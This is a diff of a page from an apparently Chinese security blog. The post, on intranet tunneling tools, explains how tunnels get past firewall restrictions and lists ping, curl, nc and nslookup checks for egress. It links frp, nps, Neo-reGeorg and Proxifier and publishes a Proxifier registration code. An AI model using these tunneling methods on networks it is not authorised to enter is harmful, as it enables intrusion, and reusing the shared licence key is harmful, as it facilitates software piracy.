@@ -20,8 +20,8 @@
     <meta http-equiv="window-target" content="_top" />
     
     
-    <meta name="description" content="内网穿透" />
-    <meta name="generator" content="Hugo 0.87.0 with theme pure" />
+    <meta name="description" content="隧道搭建" />
+    <meta name="generator" content="Hugo 0.91.2 with theme pure" />
     <title>内网穿透工具的使用 - AD钙奶的博客</title>
     
     
@@ -30,20 +30,20 @@
     <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="内网穿透工具的使用" />
-<meta property="og:description" content="内网穿透" />
+<meta property="og:description" content="隧道搭建" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://ad-calcium.github.io/2021/07/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" /><meta property="article:section" content="posts" />
-
-<meta property="article:modified_time" content="2021-07-23T00:00:00+00:00" />
-<meta property="og:see_also" content="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/exchange2019%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/08/proxyshell%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/" />
+<meta property="article:published_time" content="2021-07-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-09-04T00:00:00+00:00" />
+<meta property="og:see_also" content="https://ad-calcium.github.io/2022/08/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%A4%8D%E7%9B%98/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2022/05/%E4%B8%80%E6%AC%A1%E5%B9%B3%E5%B9%B3%E6%97%A0%E5%A5%87%E7%9A%84%E6%B8%97%E9%80%8F/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2022/03/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2022/03/spring-cloud-gateway-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-22947/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2022/02/%E5%9F%9F%E6%B8%97%E9%80%8F-ms14-068%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2014-6324/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2022/02/zabbix-saml-sso%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2022-23131/" />
 
 <meta itemprop="name" content="内网穿透工具的使用">
-<meta itemprop="description" content="内网穿透">
-<meta itemprop="dateModified" content="2021-07-23T00:00:00+00:00" />
-<meta itemprop="wordCount" content="3155">
+<meta itemprop="description" content="隧道搭建"><meta itemprop="datePublished" content="2021-07-23T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-09-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="5417">
 <meta itemprop="keywords" content="流量代理,内网渗透," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="内网穿透工具的使用"/>
-<meta name="twitter:description" content="内网穿透"/>
+<meta name="twitter:description" content="隧道搭建"/>
 
     <!--[if lte IE 9]>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -149,36 +149,84 @@
     <div id="tag-cloud-list" class="widget-body">
             
             
+            <a href="https://ad-calcium.github.io/tags/cobalt-strike/" class="tag-list-link" rel="1">cobalt-strike<span
+               class="tag-list-count">1</span></a>
+            
+            
             <a href="https://ad-calcium.github.io/tags/confluence/" class="tag-list-link" rel="1">confluence<span
                class="tag-list-count">1</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link" rel="2">exchange<span
+            <a href="https://ad-calcium.github.io/tags/exchange%E7%B3%BB%E5%88%97/" class="tag-list-link" rel="2">exchange系列<span
                class="tag-list-count">2</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="2">mssql<span
-               class="tag-list-count">2</span></a>
+            <a href="https://ad-calcium.github.io/tags/linux%E6%8F%90%E6%9D%83/" class="tag-list-link" rel="1">linux提权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="3">mssql<span
+               class="tag-list-count">3</span></a>
             
             
             <a href="https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/" class="tag-list-link" rel="2">mssql提权<span
                class="tag-list-count">2</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link" rel="5">web安全<span
-               class="tag-list-count">5</span></a>
+            <a href="https://ad-calcium.github.io/tags/mysql%E6%8F%90%E6%9D%83/" class="tag-list-link" rel="1">mysql提权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/spring/" class="tag-list-link" rel="2">spring<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web/" class="tag-list-link" rel="2">web<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link" rel="8">web安全<span
+               class="tag-list-count">8</span></a>
             
             
             <a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="1">web渗透<span
                class="tag-list-count">1</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link" rel="3">内网<span
+            <a href="https://ad-calcium.github.io/tags/win10%E7%9B%B8%E5%85%B3/" class="tag-list-link" rel="1">win10相关<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/zabbix/" class="tag-list-link" rel="1">zabbix<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="tag-list-link" rel="3">信息收集<span
                class="tag-list-count">3</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="1">内网渗透<span
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link" rel="1">内网<span
                class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="12">内网渗透<span
+               class="tag-list-count">12</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="tag-list-link" rel="4">内网环境搭建<span
+               class="tag-list-count">4</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="tag-list-link" rel="1">凭据窃取<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%90%91%E6%97%A5%E8%91%B5/" class="tag-list-link" rel="1">向日葵<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="6">域渗透<span
+               class="tag-list-count">6</span></a>
             
             
             <a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link" rel="1">安装博客<span
@@ -189,7 +237,15 @@
                class="tag-list-count">1</span></a>
             
             
+            <a href="https://ad-calcium.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" class="tag-list-link" rel="1">攻防演练<span
+               class="tag-list-count">1</span></a>
+            
+            
             <a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link" rel="1">未授权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="tag-list-link" rel="1">横向移动<span
                class="tag-list-count">1</span></a>
             
             
@@ -197,11 +253,19 @@
                class="tag-list-count">1</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="12">漏洞复现<span
-               class="tag-list-count">12</span></a>
+            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="29">漏洞复现<span
+               class="tag-list-count">29</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/" class="tag-list-link" rel="1">端口复用<span
+               class="tag-list-count">1</span></a>
             
             
             <a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link" rel="1">软件安装<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E9%92%93%E9%B1%BC/" class="tag-list-link" rel="1">钓鱼<span
                class="tag-list-count">1</span></a>
             
     </div>
@@ -233,13 +297,20 @@ function tagCloud(where, min, max) {
     <h3 class="widget-title"> 分类</h3>
     <div class="widget-body">
         <ul class="category-list">
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/cobalt-strike/" class="category-list-link">cobalt-strike</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/exchange%E7%B3%BB%E5%88%97/" class="category-list-link">exchange系列</a><span class="category-list-count">2</span></li>
             <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/" class="category-list-link">sql注入</a><span class="category-list-count">1</span></li>
-            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/" class="category-list-link">web安全</a><span class="category-list-count">1</span></li>
-            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-list-link">内网渗透</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/" class="category-list-link">web安全</a><span class="category-list-count">4</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="category-list-link">信息收集</a><span class="category-list-count">3</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-list-link">内网渗透</a><span class="category-list-count">6</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="category-list-link">内网环境搭建</a><span class="category-list-count">4</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="category-list-link">凭据窃取</a><span class="category-list-count">1</span></li>
             <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="category-list-link">小技巧</a><span class="category-list-count">3</span></li>
-            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="category-list-link">数据库</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" class="category-list-link">攻防演练</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="category-list-link">数据库</a><span class="category-list-count">3</span></li>
             <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="category-list-link">未授权漏洞</a><span class="category-list-count">1</span></li>
-            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">10</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="category-list-link">横向移动</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">33</span></li>
         </ul>
     </div>
 </div>
@@ -249,36 +320,84 @@ function tagCloud(where, min, max) {
         <ul class="tag-list">
             
             
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/cobalt-strike/" class="tag-list-link">cobalt-strike</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/confluence/" class="tag-list-link">confluence</a><span
                     class="tag-list-count">1</span></li>
             
             
-            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link">exchange</a><span
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/exchange%E7%B3%BB%E5%88%97/" class="tag-list-link">exchange系列</a><span
                     class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/linux%E6%8F%90%E6%9D%83/" class="tag-list-link">linux提权</a><span
+                    class="tag-list-count">1</span></li>
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link">mssql</a><span
-                    class="tag-list-count">2</span></li>
+                    class="tag-list-count">3</span></li>
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/" class="tag-list-link">mssql提权</a><span
                     class="tag-list-count">2</span></li>
             
             
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mysql%E6%8F%90%E6%9D%83/" class="tag-list-link">mysql提权</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/spring/" class="tag-list-link">spring</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web/" class="tag-list-link">web</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link">web安全</a><span
-                    class="tag-list-count">5</span></li>
+                    class="tag-list-count">8</span></li>
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link">web渗透</a><span
                     class="tag-list-count">1</span></li>
             
             
-            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link">内网</a><span
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/win10%E7%9B%B8%E5%85%B3/" class="tag-list-link">win10相关</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/zabbix/" class="tag-list-link">zabbix</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="tag-list-link">信息收集</a><span
                     class="tag-list-count">3</span></li>
             
             
-            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link">内网渗透</a><span
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link">内网</a><span
                     class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link">内网渗透</a><span
+                    class="tag-list-count">12</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="tag-list-link">内网环境搭建</a><span
+                    class="tag-list-count">4</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/" class="tag-list-link">凭据窃取</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%90%91%E6%97%A5%E8%91%B5/" class="tag-list-link">向日葵</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="tag-list-link">域渗透</a><span
+                    class="tag-list-count">6</span></li>
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link">安装博客</a><span
@@ -289,7 +408,15 @@ function tagCloud(where, min, max) {
                     class="tag-list-count">1</span></li>
             
             
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" class="tag-list-link">攻防演练</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link">未授权</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="tag-list-link">横向移动</a><span
                     class="tag-list-count">1</span></li>
             
             
@@ -298,10 +425,18 @@ function tagCloud(where, min, max) {
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link">漏洞复现</a><span
-                    class="tag-list-count">12</span></li>
+                    class="tag-list-count">29</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/" class="tag-list-link">端口复用</a><span
+                    class="tag-list-count">1</span></li>
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link">软件安装</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E9%92%93%E9%B1%BC/" class="tag-list-link">钓鱼</a><span
                     class="tag-list-count">1</span></li>
             
         </ul>
@@ -316,50 +451,50 @@ function tagCloud(where, min, max) {
             <li>
                 <div class="item-inner">
                     <p class="item-title">
-                        <a href="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-26084(Confluence) 漏洞复现</a>
+                        <a href="https://ad-calcium.github.io/2022/08/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%A4%8D%E7%9B%98/" class="title">攻防演练复盘</a>
                     </p>
                     <p class="item-date">
-                        <time datetime="2021-09-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-09-02</time>
+                        <time datetime="2022-08-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-08-29</time>
                     </p>
                 </div>
             </li>
             <li>
                 <div class="item-inner">
                     <p class="item-title">
-                        <a href="https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/" class="title">mssql提权之使用clr bypass360</a>
+                        <a href="https://ad-calcium.github.io/2022/05/%E4%B8%80%E6%AC%A1%E5%B9%B3%E5%B9%B3%E6%97%A0%E5%A5%87%E7%9A%84%E6%B8%97%E9%80%8F/" class="title">一次平平无奇的渗透</a>
                     </p>
                     <p class="item-date">
-                        <time datetime="2021-08-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-08-21</time>
+                        <time datetime="2022-05-09 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-05-09</time>
                     </p>
                 </div>
             </li>
             <li>
                 <div class="item-inner">
                     <p class="item-title">
-                        <a href="https://ad-calcium.github.io/2021/08/exchange2019%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" class="title">exchange2019安装教程</a>
+                        <a href="https://ad-calcium.github.io/2022/03/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="title">Spring Cloud Function SPEL 远程命令执行漏洞</a>
                     </p>
                     <p class="item-date">
-                        <time datetime="2021-08-17 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-08-17</time>
+                        <time datetime="2022-03-27 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-03-27</time>
                     </p>
                 </div>
             </li>
             <li>
                 <div class="item-inner">
                     <p class="item-title">
-                        <a href="https://ad-calcium.github.io/2021/08/proxyshell%E5%A4%8D%E7%8E%B0/" class="title">ProxyShell漏洞复现</a>
+                        <a href="https://ad-calcium.github.io/2022/03/spring-cloud-gateway-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-22947/" class="title">Spring Cloud Gateway 远程代码执行漏洞(CVE-2022-22947)</a>
                     </p>
                     <p class="item-date">
-                        <time datetime="2021-08-17 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-08-17</time>
+                        <time datetime="2022-03-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-03-04</time>
                     </p>
                 </div>
             </li>
             <li>
                 <div class="item-inner">
                     <p class="item-title">
-                        <a href="https://ad-calcium.github.io/2021/07/%E6%9F%90%E4%BF%A1xxx%E8%AE%BE%E5%A4%87%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="title">某信xxx设备存在任意文件读取漏洞</a>
+                        <a href="https://ad-calcium.github.io/2022/02/%E5%9F%9F%E6%B8%97%E9%80%8F-ms14-068%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2014-6324/" class="title">MS14-068域控提权漏洞(CVE-2014-6324)</a>
                     </p>
                     <p class="item-date">
-                        <time datetime="2021-07-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-30</time>
+                        <time datetime="2022-02-23 00:00:00 &#43;0000 UTC" itemprop="datePublished">2022-02-23</time>
                     </p>
                 </div>
             </li>
@@ -410,8 +545,8 @@ function tagCloud(where, min, max) {
     <a class="article-tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
   </span>
 
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3155字</span>
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 7分 </span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 5417字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 11分 </span>
       </div>
     </div>
     <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
@@ -420,32 +555,100 @@ function tagCloud(where, min, max) {
 <p>主要隧道有：</p>
 <pre><code>ICMP TCP UDP SSH HTTP DNS  SOCKS
 </code></pre>
+<h2 id="内网穿透原理">内网穿透原理</h2>
+<p><strong>内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</strong></p>
+<p>什么是隧道技术呢？我们看一下百科词条的解释</p>
+<blockquote>
+<p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
+</blockquote>
+<p>我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。</p>
+<p>这些隧道技术可以按所处的协议层分层。</p>
+<ul>
+<li>
+<p>网络层隧道</p>
+<blockquote>
+<p>ICMP隧道等</p>
+</blockquote>
+</li>
+<li>
+<p>传输层隧道</p>
+<blockquote>
+<p>TCP隧道、UDP隧道</p>
+</blockquote>
+</li>
+<li>
+<p>应用层隧道</p>
+<blockquote>
+<p>HTTP、DNS、SSH等隧道</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>内网主机所有可能的出网方式</strong></p>
+<ul>
+<li>
+<p>允许ICMP协议出网</p>
+<blockquote>
+<p>网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网</p>
+</blockquote>
+</li>
+<li>
+<p>允许特定的TCP或UDP协议端口出网</p>
+<blockquote>
+<p>网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致。比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行；比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口</p>
+</blockquote>
+</li>
+<li>
+<p>允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</p>
+<blockquote>
+<p>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议;通常办公网是允许HTTP协议出网的，可能会域名白名单限制
+<strong>内网主机所有可能的入网方式</strong></p>
+</blockquote>
+</li>
+<li>
+<p>允许ICMP协议入网</p>
+<blockquote>
+<p>能ping通目标主机</p>
+</blockquote>
+</li>
+<li>
+<p>允许特定的TCP或UDP协议端口入网</p>
+<blockquote>
+<p>NAT端口映射公网IP端口到内网主机的服务端口，比如将web服务、mysql服务NAT映射到公网</p>
+</blockquote>
+</li>
+<li>
+<p>允许特定的应用层协议入网</p>
+<blockquote>
+<p>这种网络防火墙能识别应用层的协议，放行允许入网的协议。比如HTTP反向代理，将公网收到的HTTP流量反向代理进内网主机。当前主流的入网方式，通常会加层WAF审查入网流量</p>
+</blockquote>
+</li>
+</ul>
 <h1 id="0x01-首先判断出网协议">0x01 首先判断出网协议</h1>
-<p>icmp协议：</p>
+<h2 id="icmp协议">icmp协议：</h2>
 <pre><code>ping www.baidu.com
 </code></pre>
-<p>TCP协议：</p>
+<h2 id="tcp协议">TCP协议：</h2>
 <pre><code>curl www.baidu.com
 nc IP
 </code></pre>
-<p>HTTP协议：</p>
+<h2 id="http协议">HTTP协议：</h2>
 <pre><code>curl ip:port
 curl www.baidu.com:80
 </code></pre>
-<p>DNS协议：</p>
+<h2 id="dns协议">DNS协议：</h2>
 <pre><code>Nslookup www.baidu.com
 Dig www.baidu.com
 </code></pre>
-<h2 id="理论知识">理论知识</h2>
-<h3 id="正向代理">正向代理</h3>
+<h1 id="0x02理论知识">0x02理论知识</h1>
+<h2 id="正向代理">正向代理</h2>
 <pre><code>正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）
 </code></pre>
-<h3 id="反向代理">反向代理</h3>
+<h2 id="反向代理">反向代理</h2>
 <pre><code>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器
 </code></pre>
-<h3 id="常用工具">常用工具：</h3>
-<pre><code>proxifier:   https://www.proxifier.com/
-frp:           https://github.com/fatedier/frp
+<h1 id="0x03常用工具">0x03常用工具</h1>
+<pre><code>https://www.proxifier.com/
+https://github.com/fatedier/frp
 https://github.com/ehang-io/nps
 https://github.com/L-codes/Neo-reGeorg
 
@@ -454,63 +657,29 @@ proxifier注册码
 用户名：zxhi
 注册码：LYZGL-F2KX3-JW5W4-A33MC-25QHH
 </code></pre>
